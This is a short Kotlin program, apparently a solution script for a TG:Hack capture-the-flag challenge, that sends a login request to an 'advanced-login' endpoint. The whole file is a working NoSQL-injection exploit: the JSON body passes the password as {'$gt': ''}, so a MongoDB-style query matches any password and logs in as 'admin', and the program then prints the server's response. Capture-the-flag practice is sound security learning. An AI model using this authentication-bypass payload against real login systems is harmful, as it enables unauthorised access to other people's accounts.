import okhttp3.MediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody

fun main(args: Array<String>) {
    val url = "http://advanced-login.tghack.no"
    val client = OkHttpClient()

    val request = Request.Builder()
            .post(RequestBody.create(MediaType.parse("application/json"), "{\"user\":\"admin\", \"pass\":{\"\$gt\": \"\"}}"))
            .url("$url/login")
            .build()

    val response = client.newCall(request).execute()

    println(response.body()?.string()?: "No body received")
}